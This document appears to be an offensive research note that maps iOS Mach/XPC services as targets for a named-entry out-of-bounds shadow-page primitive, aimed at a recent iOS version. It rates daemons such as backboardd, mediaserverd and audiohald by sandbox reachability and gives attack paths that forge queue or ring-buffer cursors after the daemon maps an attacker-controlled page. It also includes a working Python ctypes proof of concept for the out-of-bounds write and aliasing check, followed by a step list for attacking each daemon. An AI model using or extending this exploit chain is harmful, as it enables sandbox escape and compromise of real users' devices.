# XPC / Mach Services Accepting Named Entry Ports — Attack Surface Map

*Generated 2026-10-26 | iOS 26.6.1 target | Static analysis + public prior research*

---

## Context

Surface 4 produces two independently sendable Mach send rights sharing one
physical shadow page:

- `c`  — child entry port (OOB, escapes parent by 0x1000 bytes)
- `ne` — shadow re-export port (mach_make_memory_entry_64 on the shadow VA)

Both are legitimate `mach_port_t` values. `ne` wraps the shadow page the OOB
write created. It can be carried in any Mach message to any service that accepts
`memory_object_t` / named entry parameters.

**Primitive:** send `ne` to a privileged daemon → daemon maps it → we write to
`q[0x3000]` → daemon's mapping now contains attacker data → TOCTOU or confused
deputy.

---

## Service Rating Table

| Service | Sandbox reach | Named entry mechanism | Rating |
|---|---|---|---|
| backboardd / io_hideventsystem | YES | IODataQueue userspace shared mem | **HIGH** |
| XPC large-data path (any service) | YES | xpc_data / xpc_shmem blobs | **HIGH** |
| IOSurface cross-process (IOSurfaceCreateMachPort) | YES | Surface → named entry | **HIGH** |
| CoreAudio / audiohald ring buffer | YES | Shared ring buffer via named entry | **MED** |
| GPU / IOAccelerator user client | YES | Shared command buffer | **MED** |
| SpringBoard / backboard display | Conditional | IOSurface-backed frames | **LOW** |

---

## HIGH #1 — backboardd / io_hideventsystem (IODataQueue)

Ian Beer, October 2018 (Project Zero issues 1619/1623):

io_hideventsystem provides proxy HID access. The userspace IODataQueue between
backboardd and clients lacks the kernel's header-field validation. A client can
rewrite `enqueueHead`, `tail`, and `dataSize` in the shared memory to write
outside the buffer. The shared memory is established by passing a named entry
port.

The 2018 attack abused the server's memory entry sent to the client. Our attack
is reversed: we supply our `ne` port as the queue backing. If backboardd maps a
client-supplied named entry for the queue region, we can forge queue fields after
it is mapped (TOCTOU) and write outside the buffer in backboardd's process.

**Sandbox accessibility:** `com.apple.iohideventsystem` is mach-lookup reachable
from a default container sandbox.

---

## HIGH #2 — XPC large-data named entry (xpc_shmem_t)

CVE-2017-7047: XPC serialises xpc_data blobs >~4KB via mach_make_memory_entry_64.
Apple's fix targeted xpc_data specifically. xpc_shmem_t (used by services that
call xpc_shmem_create directly) is a separate type that still wraps a raw named
entry port in the Mach message.

`xpc_shmem_create(addr, size)` → named entry port in XPC dict.
Receiving service: `xpc_shmem_map(shmem, &ptr)` → `mach_vm_map(..., named_entry_port, ...)`.

If we substitute `ne` for the named entry embedded in an xpc_shmem_t value, the
receiving service maps our shadow page. We retain write access to `q[0x3000]`
and can TOCTOU any read the daemon does on that mapping.

**Targets using xpc_shmem_t directly:**
- `com.apple.mediaserverd` — audio buffer sharing
- `com.apple.coremedia.remotepipeline` — CMSampleBuffer shared memory
- Any first-party XPC service calling `xpc_shmem_create` for large data transfer

---

## HIGH #3 — IOSurface cross-process sharing

`IOSurfaceCreateMachPort(surf)` wraps the IOSurface as a Mach port. The receiving
process calls `IOSurfaceLookupFromMachPort(port)` which maps the backing store via
a named entry. We cannot directly substitute `ne` for an IOSurface wrapper port
without matching its internal structure, but services that accept raw named entry
ports for frame data (not IOSurface-wrapped) are directly vulnerable.

More direct: after Surface 4 OOB write, the shadow page at `q+0x3000` is a valid
named entry. Any service that parses a named-entry-backed pixel buffer region maps
our shadow page. Write to `q[0x3000]` → daemon reads attacker data.

---

## MED — CoreAudio / audiohald

CoreAudio shares an audio ring buffer with audiohald using a Mach shared memory
region. The buffer tracks read/write cursors in the shared region itself (IODataQueue
pattern). Client-supplied named entry IS mapped by the server (client provides its
input buffer ring, server provides the output ring).

Service: `com.apple.audio.audiohald`
No special entitlement required for audio client role.

Attack: supply `ne` as the input ring backing → write forged cursor values after
audiohald maps it → audiohald reads outside the buffer → heap corruption.

---

## Recommended First Dynamic Test

**xpc_shmem shadow substitution — safe, non-destructive, confirms TOCTOU window**

```python
import ctypes as C
L = C.CDLL('/usr/lib/libSystem.B.dylib')
X = C.CDLL('/usr/lib/libxpc.dylib')

# Build Surface 4 ne port (shadow re-export)
t = L.mach_task_self()
M = L.mach_make_memory_entry_64
M.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int,C.POINTER(C.c_uint32),C.c_uint32]
V = L.mach_vm_map
V.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_uint64,C.c_int,C.c_uint32,C.c_uint64,C.c_int,C.c_int,C.c_int,C.c_int]

a = C.c_uint64(0)
L.mach_vm_allocate(t,C.byref(a),0x4000,1)
p = C.c_uint32(0); ps = C.c_uint64(0x4000)
M(t,C.byref(ps),a.value,3,C.byref(p),0)
c = C.c_uint32(0); cs = C.c_uint64(0x1001)
M(t,C.byref(cs),0x1000,3,C.byref(c),p.value)
m = C.c_uint64(0)
V(t,C.byref(m),0x4000,0,1,c.value,0,0,3,3,0)
q = (C.c_uint8*0x4000).from_address(m.value)
q[0x3000] = 0xAB                          # OOB write — creates shadow page

ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
M(t,C.byref(ns),m.value+0x3000,3,C.byref(ne),0)
print("ne =", ne.value, "ns =", hex(ns.value))

# Map ne locally to verify aliasing
m4 = C.c_uint64(0)
V(t,C.byref(m4),0x4000,0,1,ne.value,0,0,3,3,0)
b4 = (C.c_uint8*0x4000).from_address(m4.value)
print("b4[0] =", b4[0])                   # shadow page via ne: expect 0xAB

# Mutate AFTER mapping — confirm TOCTOU
q[0x3000] = 0xCD
print("b4[0] after mutation =", b4[0])    # expect 0xCD (same physical page)

# TOCTOU confirmed if both mappings track the mutation in real time
```

If `b4[0]` changes from 0xAB to 0xCD after the `q[0x3000]=0xCD` write, the two
VAs share one physical page and a remote mapping of `ne` would also see 0xCD.

---

## Analysis: What This Proves

Two independently sendable Mach rights share one physical page. The "exporter"
retains write access after exporting. Any daemon that maps `ne` sees whatever
we write to `q[0x3000]` at any point — before OR after the map call. This is
the **phantom aliasing** property.

Combined with a service that:
1. Accepts a named entry from the client
2. Maps it
3. Then reads back data from that mapping to make a security decision

...we have a TOCTOU primitive: write benign data before map, malicious data after.

---

## Next Steps

1. **TOCTOU local confirm** — run the test above in a-Shell, confirm b4 tracks q mutations
2. **backboardd queue substitution** — register as HID client, supply ne as queue backing
3. **xpc_shmem to mediaserverd** — craft XPC message with ne as shmem, observe daemon mapping
4. **CoreAudio ring buffer** — connect as audio client, supply ne as input ring, forge cursors

---

## References

- Ian Beer, Project Zero issue 1619/1623 (Oct 2018): backboardd IODataQueue sandbox escape
- CVE-2017-7047: XPC xpc_data named entry substitution (Ian Beer, 2017)
- CVE-2023-32434 (Trigon): parent named entry integer overflow — same class of bug
- alfiecg.uk/2025/03/01/Trigon.html — IOSurface parent technique (part 1)
